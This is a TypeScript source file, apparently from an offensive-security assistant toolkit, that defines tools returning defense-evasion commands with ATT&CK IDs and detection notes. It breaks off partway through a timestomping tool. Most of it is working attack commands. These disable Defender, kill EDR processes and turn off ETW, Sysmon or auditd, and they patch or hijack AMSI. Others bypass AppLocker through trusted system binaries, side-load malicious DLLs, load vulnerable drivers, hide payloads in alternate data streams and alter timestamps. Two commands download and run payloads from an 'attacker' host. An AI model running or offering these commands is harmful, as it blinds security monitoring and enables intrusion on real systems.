import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

interface EvasionTechnique {
  technique: string;
  description: string;
  platform: Platform;
  binary: string;
  command: string;
  cleanup_command: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
}

// ── evasion_bypass_edr ────────────────────────────────────────────────────────

const evasion_bypass_edr: ToolDef = {
  name: "evasion_bypass_edr",
  description:
    "Find techniques to bypass or disable EDR/AV products using living-off-the-land binaries (ATT&CK T1562)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows", "linux", "macos"])
      .default("windows")
      .describe("Target platform for EDR bypass techniques"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific EDR/AV product name to target (e.g., 'defender', 'crowdstrike', 'sentinelone')"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = args.platform ?? "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbBypass = ctx.knowledgeBase.searchByKeyword("bypass", platform);
    const kbEdr = ctx.knowledgeBase.searchByKeyword("edr", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbBypass, ...kbEdr])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "Disable Windows Defender via PowerShell",
        description: "Use Set-MpPreference to disable real-time monitoring and other Defender features",
        platform: "windows",
        binary: "powershell.exe",
        command: "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true",
        cleanup_command: "Set-MpPreference -DisableRealtimeMonitoring $false -DisableIOAVProtection $false -DisableBehaviorMonitoring $false",
        stealth_score: 4,
        attck_ids: ["T1562.001"],
        prerequisites: ["Administrator access", "Tamper Protection disabled"],
        detection_notes: "Event ID 5001 (Defender real-time protection disabled). Tamper Protection blocks this in modern Windows.",
      },
      {
        technique: "Add Defender Exclusion Path",
        description: "Add exclusion paths to Windows Defender to whitelist payload directories",
        platform: "windows",
        binary: "powershell.exe",
        command: 'Add-MpPreference -ExclusionPath "C:\\Users\\Public" -ExclusionProcess "payload.exe"',
        cleanup_command: 'Remove-MpPreference -ExclusionPath "C:\\Users\\Public" -ExclusionProcess "payload.exe"',
        stealth_score: 3,
        attck_ids: ["T1562.001"],
        prerequisites: ["Administrator access"],
        detection_notes: "Event ID 5007 (Defender configuration changed). Registry key HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions.",
      },
      {
        technique: "Kill EDR Process via taskkill",
        description: "Terminate EDR agent processes directly using taskkill or wmic",
        platform: "windows",
        binary: "taskkill.exe",
        command: "taskkill /F /IM MsMpEng.exe & taskkill /F /IM SenseIR.exe",
        cleanup_command: "Restart the EDR service or reboot the system",
        stealth_score: 5,
        attck_ids: ["T1562.001"],
        prerequisites: ["SYSTEM access", "EDR self-protection bypass"],
        detection_notes: "Most EDR products protect their processes via PPL. Process termination events logged.",
      },
      {
        technique: "Disable ETW Provider",
        description: "Patch ETW (Event Tracing for Windows) provider to blind security tooling",
        platform: "windows",
        binary: "logman.exe",
        command: 'logman stop "EventLog-Security" -ets',
        cleanup_command: 'logman start "EventLog-Security" -ets',
        stealth_score: 1,
        attck_ids: ["T1562"],
        prerequisites: ["Administrator access"],
        detection_notes: "Loss of ETW events is itself a detection signal. Monitor for ETW provider configuration changes.",
      },
      {
        technique: "Unload Sysmon Driver",
        description: "Unload the Sysmon driver to remove kernel-level monitoring",
        platform: "windows",
        binary: "fltMC.exe",
        command: "fltMC unload SysmonDrv",
        cleanup_command: "fltMC load SysmonDrv",
        stealth_score: 2,
        attck_ids: ["T1562.001"],
        prerequisites: ["Administrator access"],
        detection_notes: "Sysmon event gap is detectable. Driver load/unload events (Event ID 6).",
      },
      {
        technique: "Stop Linux auditd",
        description: "Stop or disable the Linux audit daemon to prevent syscall logging",
        platform: "linux",
        binary: "systemctl",
        command: "systemctl stop auditd && systemctl disable auditd",
        cleanup_command: "systemctl enable auditd && systemctl start auditd",
        stealth_score: 3,
        attck_ids: ["T1562.001"],
        prerequisites: ["Root access"],
        detection_notes: "Monitoring daemon health. SIEM alert on log source going silent.",
      },
    ];

    const filtered = techniques.filter(t => t.platform === platform || platform === "windows");

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        edr_product: args.edr_product ?? "unknown",
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Elevated privileges confirmed — direct EDR tampering techniques are viable."
          : "Standard user access — Defender exclusion paths or ETW patching may require privilege escalation first.",
      };
    }

    return json({
      platform,
      edr_product: args.edr_product ?? null,
      total_techniques: filtered.length,
      techniques: filtered,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── evasion_amsi_bypass ───────────────────────────────────────────────────────

const evasion_amsi_bypass: ToolDef = {
  name: "evasion_amsi_bypass",
  description:
    "Find AMSI (Antimalware Scan Interface) bypass techniques for PowerShell and .NET (ATT&CK T1562.001)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (AMSI is Windows-specific)"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific AMSI consumer product name"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbAmsi = ctx.knowledgeBase.searchByKeyword("amsi", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbAmsi])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "AMSI Memory Patch (amsiInitFailed)",
        description: "Set the amsiInitFailed flag in the AmsiUtils class to skip all AMSI scans in the current PowerShell session",
        platform,
        binary: "powershell.exe",
        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        cleanup_command: "Restart the PowerShell session",
        stealth_score: 2,
        attck_ids: ["T1562.001"],
        prerequisites: ["PowerShell access"],
        detection_notes: "Script block logging (Event ID 4104) captures the bypass. Signature-based detection by Defender.",
      },
      {
        technique: "AMSI DLL Hijack",
        description: "Place a custom amsi.dll in the application directory to prevent the real AMSI DLL from loading",
        platform,
        binary: "cmd.exe",
        command: "copy custom_amsi.dll C:\\Users\\Public\\amsi.dll && set PATH=C:\\Users\\Public;%PATH%",
        cleanup_command: "del C:\\Users\\Public\\amsi.dll",
        stealth_score: 1,
        attck_ids: ["T1562.001", "T1574.001"],
        prerequisites: ["Custom AMSI stub DLL", "Write access to PATH directory"],
        detection_notes: "Monitor for amsi.dll loaded from non-standard paths. Sysmon Event ID 7.",
      },
      {
        technique: "AMSI Bypass via COM Server Hijack",
        description: "Hijack the AMSI COM server registration to redirect AMSI initialization to a dummy implementation",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\fake_amsi.dll" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}" /f',
        stealth_score: 1,
        attck_ids: ["T1562.001", "T1546.015"],
        prerequisites: ["User-level access", "Custom AMSI stub DLL"],
        detection_notes: "Monitor HKCU COM server registrations. Registry audit events.",
      },
      {
        technique: "AMSI Bypass via PowerShell Downgrade",
        description: "Use PowerShell v2 which does not support AMSI, bypassing all AMSI-based detection",
        platform,
        binary: "powershell.exe",
        command: "powershell -version 2 -command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\"",
        cleanup_command: "N/A — session-level bypass",
        stealth_score: 3,
        attck_ids: ["T1562.001"],
        prerequisites: [".NET Framework 2.0 installed", "PowerShell v2 engine available"],
        detection_notes: "Event ID 400 shows engine version. PowerShell v2 usage is anomalous and detectable.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        recommendations: "AMSI bypasses work at user level. Check if PowerShell v2 is available and if script block logging is enabled.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── evasion_applocker ─────────────────────────────────────────────────────────

const evasion_applocker: ToolDef = {
  name: "evasion_applocker",
  description:
    "Find AppLocker and WDAC bypass techniques using trusted LOL binaries (ATT&CK T1218)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (AppLocker is Windows-specific)"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific application whitelisting product"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbApplocker = ctx.knowledgeBase.searchByKeyword("applocker", platform);
    const kbBypass = ctx.knowledgeBase.searchByKeyword("bypass", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbApplocker, ...kbBypass])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "MSBuild Inline Task Execution",
        description: "Use MSBuild.exe to compile and execute inline C# tasks from a .csproj or .xml file, bypassing AppLocker",
        platform,
        binary: "MSBuild.exe",
        command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj",
        cleanup_command: "del payload.csproj",
        stealth_score: 2,
        attck_ids: ["T1218"],
        prerequisites: [".NET Framework installed"],
        detection_notes: "Monitor MSBuild.exe execution with unusual arguments. Sysmon process creation events.",
      },
      {
        technique: "Regsvr32 Scrobj Execution",
        description: "Use regsvr32.exe to fetch and execute a remote SCT (COM scriptlet) file",
        platform,
        binary: "regsvr32.exe",
        command: 'regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll',
        cleanup_command: "N/A — in-memory execution",
        stealth_score: 2,
        attck_ids: ["T1218.010"],
        prerequisites: ["Network access to attacker server"],
        detection_notes: "Regsvr32.exe making outbound HTTP requests is anomalous. Sysmon network events.",
      },
      {
        technique: "CMSTP Profile Install",
        description: "Use cmstp.exe to install a malicious INF file that executes arbitrary commands",
        platform,
        binary: "cmstp.exe",
        command: 'cmstp.exe /ni /s payload.inf',
        cleanup_command: "del payload.inf",
        stealth_score: 1,
        attck_ids: ["T1218.003"],
        prerequisites: ["Crafted INF file"],
        detection_notes: "Monitor cmstp.exe for /ni /s flags. Rarely used legitimately.",
      },
      {
        technique: "Rundll32 JavaScript Execution",
        description: "Use rundll32.exe to execute JavaScript via mshtml or url.dll",
        platform,
        binary: "rundll32.exe",
        command: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval("payload")',
        cleanup_command: "N/A — in-memory execution",
        stealth_score: 2,
        attck_ids: ["T1218.011"],
        prerequisites: ["User-level access"],
        detection_notes: "Rundll32 with JavaScript protocol is highly anomalous. Command-line logging detects this.",
      },
      {
        technique: "InstallUtil Bypass",
        description: "Use InstallUtil.exe to execute .NET assemblies that bypass AppLocker by running code in Uninstall() method",
        platform,
        binary: "InstallUtil.exe",
        command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe",
        cleanup_command: "del payload.exe",
        stealth_score: 2,
        attck_ids: ["T1218.004"],
        prerequisites: [".NET Framework installed", "Compiled .NET assembly"],
        detection_notes: "Monitor InstallUtil.exe with /U flag. Sysmon process creation.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        recommendations: "AppLocker bypass techniques work at user level. Identify which LOL binaries are available on the target and not blocked by policy.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── evasion_obfuscate ─────────────────────────────────────────────────────────

const evasion_obfuscate: ToolDef = {
  name: "evasion_obfuscate",
  description:
    "Find command and payload obfuscation techniques using native OS tools (ATT&CK T1027)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows", "linux", "macos"])
      .default("windows")
      .describe("Target platform for obfuscation techniques"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific EDR/AV product to evade"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = args.platform ?? "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbObfuscate = ctx.knowledgeBase.searchByKeyword("obfuscate", platform);
    const kbEncode = ctx.knowledgeBase.searchByKeyword("encode", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbObfuscate, ...kbEncode])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "PowerShell Base64 Encoded Command",
        description: "Execute Base64-encoded PowerShell commands using the -EncodedCommand parameter",
        platform: "windows",
        binary: "powershell.exe",
        command: 'powershell -EncodedCommand <Base64String>',
        cleanup_command: "N/A — in-memory execution",
        stealth_score: 3,
        attck_ids: ["T1027"],
        prerequisites: ["PowerShell access"],
        detection_notes: "Script block logging decodes the command. -EncodedCommand usage is a known indicator.",
      },
      {
        technique: "CMD Environment Variable Obfuscation",
        description: "Use cmd.exe environment variable expansion and substring operations to build commands dynamically",
        platform: "windows",
        binary: "cmd.exe",
        command: 'cmd /V:ON /C "set x=whoami&&!x!"',
        cleanup_command: "N/A — session-level",
        stealth_score: 2,
        attck_ids: ["T1027"],
        prerequisites: ["cmd.exe access"],
        detection_notes: "Command-line logging captures the set and expansion. DOSfuscation detection tools.",
      },
      {
        technique: "Certutil Base64 Decode",
        description: "Use certutil.exe to decode a Base64-encoded payload on disk",
        platform: "windows",
        binary: "certutil.exe",
        command: "certutil -decode encoded_payload.b64 payload.exe",
        cleanup_command: "del encoded_payload.b64 payload.exe",
        stealth_score: 3,
        attck_ids: ["T1027", "T1140"],
        prerequisites: ["User-level access"],
        detection_notes: "Certutil with -decode flag is well-known. Sysmon process creation monitoring.",
      },
      {
        technique: "Bash Base64 Decode and Execute",
        description: "Decode and execute a Base64-encoded payload using bash and base64 utility",
        platform: "linux",
        binary: "bash",
        command: 'echo "<base64_payload>" | base64 -d | bash',
        cleanup_command: "N/A — in-memory execution",
        stealth_score: 2,
        attck_ids: ["T1027"],
        prerequisites: ["bash access"],
        detection_notes: "Auditd syscall monitoring. Shell history logging. Process tree analysis.",
      },
      {
        technique: "XOR Encode via PowerShell",
        description: "XOR-encode a payload string in PowerShell to evade static signature detection",
        platform: "windows",
        binary: "powershell.exe",
        command: "$key=0x42; $enc=[System.Text.Encoding]::UTF8.GetBytes('payload'); $dec=$enc|%{$_ -bxor $key}; IEX([System.Text.Encoding]::UTF8.GetString($dec))",
        cleanup_command: "N/A — in-memory execution",
        stealth_score: 2,
        attck_ids: ["T1027"],
        prerequisites: ["PowerShell access"],
        detection_notes: "Script block logging captures the full deobfuscated output. AMSI may detect.",
      },
    ];

    const filtered = techniques.filter(t => t.platform === platform);

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        recommendations: "Obfuscation techniques generally work at user level. Combine with AMSI bypass for PowerShell-based approaches.",
      };
    }

    return json({
      platform,
      total_techniques: filtered.length,
      techniques: filtered,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── evasion_dll_sideload ──────────────────────────────────────────────────────

const evasion_dll_sideload: ToolDef = {
  name: "evasion_dll_sideload",
  description:
    "Find DLL side-loading opportunities using signed binaries to load malicious DLLs (ATT&CK T1574.002)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (DLL side-loading is Windows-specific)"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific EDR/AV product to consider for bypass"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbSideload = ctx.knowledgeBase.searchByKeyword("sideload", platform);
    const kbDll = ctx.knowledgeBase.searchByKeyword("dll", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbSideload, ...kbDll])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "Signed Binary DLL Side-Load",
        description: "Copy a signed Microsoft binary to a writable directory and place a malicious DLL with the expected name",
        platform,
        binary: "cmd.exe",
        command: "copy C:\\Windows\\System32\\consent.exe C:\\Users\\Public\\ && copy evil.dll C:\\Users\\Public\\comctl32.dll && C:\\Users\\Public\\consent.exe",
        cleanup_command: "del C:\\Users\\Public\\consent.exe C:\\Users\\Public\\comctl32.dll",
        stealth_score: 1,
        attck_ids: ["T1574.002"],
        prerequisites: ["Knowledge of DLL dependency", "Crafted proxy DLL"],
        detection_notes: "Monitor for signed binaries executing from non-standard paths. Sysmon Event ID 7 for DLL loads.",
      },
      {
        technique: "OneDrive DLL Side-Load",
        description: "Leverage the OneDrive updater binary which loads specific DLLs from its directory",
        platform,
        binary: "OneDriveStandaloneUpdater.exe",
        command: 'copy evil.dll "%LOCALAPPDATA%\\Microsoft\\OneDrive\\version.dll" && "%LOCALAPPDATA%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe"',
        cleanup_command: 'del "%LOCALAPPDATA%\\Microsoft\\OneDrive\\version.dll"',
        stealth_score: 1,
        attck_ids: ["T1574.002"],
        prerequisites: ["OneDrive installed", "Write access to OneDrive directory"],
        detection_notes: "OneDrive loading unexpected DLLs. DLL hash comparison.",
      },
      {
        technique: "Teams DLL Side-Load",
        description: "Abuse Microsoft Teams' Electron framework which loads multiple DLLs from its app directory",
        platform,
        binary: "Teams.exe",
        command: 'copy evil.dll "%LOCALAPPDATA%\\Microsoft\\Teams\\current\\dbghelp.dll"',
        cleanup_command: 'del "%LOCALAPPDATA%\\Microsoft\\Teams\\current\\dbghelp.dll"',
        stealth_score: 1,
        attck_ids: ["T1574.002"],
        prerequisites: ["Microsoft Teams installed"],
        detection_notes: "Unexpected DLL loads by Teams.exe. File integrity monitoring on Teams directory.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const writablePaths = session.state.writablePaths;
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        writable_paths_count: writablePaths.length,
        recommendations: "Identify signed applications in writable directories. Use tools like SigFlip or DLLirant to find side-loading opportunities.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── evasion_driver_load ───────────────────────────────────────────────────────

const evasion_driver_load: ToolDef = {
  name: "evasion_driver_load",
  description:
    "Find vulnerable driver loading techniques to disable security products at kernel level (ATT&CK T1562)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (driver loading is Windows-specific)"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific EDR/AV product to target with BYOVD"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbDriver = ctx.knowledgeBase.searchByKeyword("driver", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbDriver])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "BYOVD (Bring Your Own Vulnerable Driver)",
        description: "Load a signed but vulnerable kernel driver to gain kernel-level access and disable EDR callbacks",
        platform,
        binary: "sc.exe",
        command: 'sc create VulnDrv type= kernel binPath= "C:\\Users\\Public\\vuln_driver.sys" && sc start VulnDrv',
        cleanup_command: "sc stop VulnDrv && sc delete VulnDrv && del C:\\Users\\Public\\vuln_driver.sys",
        stealth_score: 1,
        attck_ids: ["T1562.001"],
        prerequisites: ["Administrator access", "Signed vulnerable driver (.sys)"],
        detection_notes: "Driver load events (Sysmon Event ID 6). Microsoft Vulnerable Driver Blocklist. HVCI may block.",
      },
      {
        technique: "Process Explorer Driver (procexp)",
        description: "Use the Process Explorer driver (PROCEXP152.SYS) which can terminate protected processes",
        platform,
        binary: "sc.exe",
        command: 'sc create procexp type= kernel binPath= "C:\\Users\\Public\\PROCEXP152.SYS" && sc start procexp',
        cleanup_command: "sc stop procexp && sc delete procexp",
        stealth_score: 2,
        attck_ids: ["T1562.001"],
        prerequisites: ["Administrator access", "PROCEXP152.SYS driver file"],
        detection_notes: "Known vulnerable driver. On Microsoft Vulnerable Driver Blocklist.",
      },
      {
        technique: "Disable DSE via CI.dll Patch",
        description: "Exploit a vulnerable driver to patch ci.dll in memory and disable Driver Signature Enforcement",
        platform,
        binary: "cmd.exe",
        command: "Load vulnerable driver, use its read/write primitives to patch g_CiOptions in CI.dll",
        cleanup_command: "Reboot to restore DSE",
        stealth_score: 1,
        attck_ids: ["T1562"],
        prerequisites: ["Administrator access", "Vulnerable driver with r/w primitives"],
        detection_notes: "HVCI prevents this. Kernel integrity checking. PatchGuard detection.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const loadedDrivers = session.state.loadedDrivers;
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        loaded_drivers_count: loadedDrivers.length,
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Elevated privileges confirmed — BYOVD techniques are viable. Check if HVCI and the Vulnerable Driver Blocklist are active."
          : "Administrator or SYSTEM access required for driver loading. Privilege escalation needed first.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── evasion_ads_hide ──────────────────────────────────────────────────────────

const evasion_ads_hide: ToolDef = {
  name: "evasion_ads_hide",
  description:
    "Find techniques to hide payloads in NTFS Alternate Data Streams (ATT&CK T1564.004)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (ADS is Windows/NTFS-specific)"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific EDR/AV product to consider"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbAds = ctx.knowledgeBase.searchByKeyword("alternate data stream", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbAds])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "Hide Payload in ADS",
        description: "Store a payload binary inside an NTFS Alternate Data Stream, invisible to standard directory listings",
        platform,
        binary: "cmd.exe",
        command: 'type payload.exe > C:\\Users\\Public\\legit.txt:hidden.exe',
        cleanup_command: 'Remove the ADS: (requires PowerShell) Remove-Item -Path "C:\\Users\\Public\\legit.txt" -Stream "hidden.exe"',
        stealth_score: 1,
        attck_ids: ["T1564.004"],
        prerequisites: ["NTFS filesystem", "Write access"],
        detection_notes: "dir /R shows ADS. Sysmon Event ID 15 (FileCreateStreamHash). Streams.exe from Sysinternals.",
      },
      {
        technique: "Execute from ADS via wmic",
        description: "Execute a payload stored in an ADS using wmic process call create",
        platform,
        binary: "wmic.exe",
        command: 'wmic process call create "C:\\Users\\Public\\legit.txt:hidden.exe"',
        cleanup_command: "Terminate the spawned process",
        stealth_score: 1,
        attck_ids: ["T1564.004", "T1218"],
        prerequisites: ["Payload stored in ADS"],
        detection_notes: "wmic spawning processes from ADS paths. Process creation logging.",
      },
      {
        technique: "PowerShell Script in ADS",
        description: "Store and execute a PowerShell script from an Alternate Data Stream",
        platform,
        binary: "powershell.exe",
        command: 'Set-Content -Path "C:\\Users\\Public\\notes.txt" -Stream "script.ps1" -Value "Get-Process" && powershell -Command "Get-Content -Path C:\\Users\\Public\\notes.txt -Stream script.ps1 | IEX"',
        cleanup_command: 'Remove-Item -Path "C:\\Users\\Public\\notes.txt" -Stream "script.ps1"',
        stealth_score: 1,
        attck_ids: ["T1564.004"],
        prerequisites: ["PowerShell access", "NTFS filesystem"],
        detection_notes: "Script block logging captures the IEX content. Sysmon Event ID 15.",
      },
      {
        technique: "Macro ADS Payload Drop",
        description: "Use a VBA macro in Office to write a payload to an ADS and then execute it",
        platform,
        binary: "cmd.exe",
        command: 'echo payload_bytes > "%APPDATA%\\Microsoft\\Word\\STARTUP\\Normal.dotm:payload.exe"',
        cleanup_command: "Remove the ADS from Normal.dotm",
        stealth_score: 1,
        attck_ids: ["T1564.004", "T1137"],
        prerequisites: ["Office installed", "Write access to STARTUP directory"],
        detection_notes: "Office macro execution logging. ADS creation on Office template files is suspicious.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        recommendations: "ADS techniques work at user level on NTFS volumes. Verify target filesystem is NTFS, not FAT32/exFAT.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── evasion_timestomp ─────────────────────────────────────────────────────────

const evasion_timestomp: ToolDef = {
  name: "evasion_timestomp",
  description:
    "Find file timestamp manipulation (timestomping) techniques to evade forensic timeline analysis (ATT&CK T1070.006)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows", "linux", "macos"])
      .default("windows")
      .describe("Target platform for timestomping techniques"),
    edr_product: z
      .string()
      .optional()
      .describe("Specific EDR/AV product to consider"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = args.platform ?? "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbEvasion = ctx.knowledgeBase.searchByFunction("defense_evasion", platform);
    const kbTimestomp = ctx.knowledgeBase.searchByKeyword("timestomp", platform);
    const kbTimestamp = ctx.knowledgeBase.searchByKeyword("timestamp", platform);
    const kbEntries = deduplicateByBinary([...kbEvasion, ...kbTimestomp, ...kbTimestamp])
      .filter(e => e.platform === platform);

    const techniques: EvasionTechnique[] = [
      {
        technique: "PowerShell Timestamp Modification",
        description: "Use PowerShell to modify CreationTime, LastWriteTime, and LastAccessTime of a file",
        platform: "windows",
        binary: "powershell.exe",
        command: '(Get-Item "C:\\Users\\Public\\payload.exe").CreationTime = "01/01/2020 12:00:00"; (Get-Item "C:\\Users\\Public\\payload.exe").LastWriteTime = "01/01/2020 12:00:00"',
        cleanup_command: "N/A — timestamps cannot be 'uncovered'",
        stealth_score: 2,
        attck_ids: ["T1070.006"],
        prerequisites: ["Write access to the target file"],
        detection_notes: "$SI vs $FN timestamp discrepancies in MFT analysis. NTFS $MFT journal analysis.",
      },
      {
        technique: "Linux touch Timestamp",
        description: "Use the touch command to change file access and modification times",
        platform: "linux",
        binary: "touch",
        command: 'touch -t 202001011200.00 /tmp/.payload && touch -r /usr/bin/ls /tmp/.payload',
        cleanup_command: "N/A — original timestamps are lost",
        stealth_score: 2,
        attck_ids: ["T1070.006"],
        prerequisites: ["Write access to the target file"],
        detection_notes: "Auditd monitoring on touch syscalls. Inode change time (ctime) cannot be modified with touch.",
      },
      {
        technique: "macOS touch Timestamp",
        description: "Use touch to set file timestamps on macOS, matching legitimate system files",
        platform: "macos",
        binary: "touch",
        command: 'touch -t 202001011200.00 /tmp/.payload && touch -r /usr/bin/ls /tmp/.payload',
        cleanup_command: "N/A — original timestamps are lost",
        stealth_score: 2,
        attck_ids: ["T1070.006"],
        prerequisites: ["Write access to the target file"],
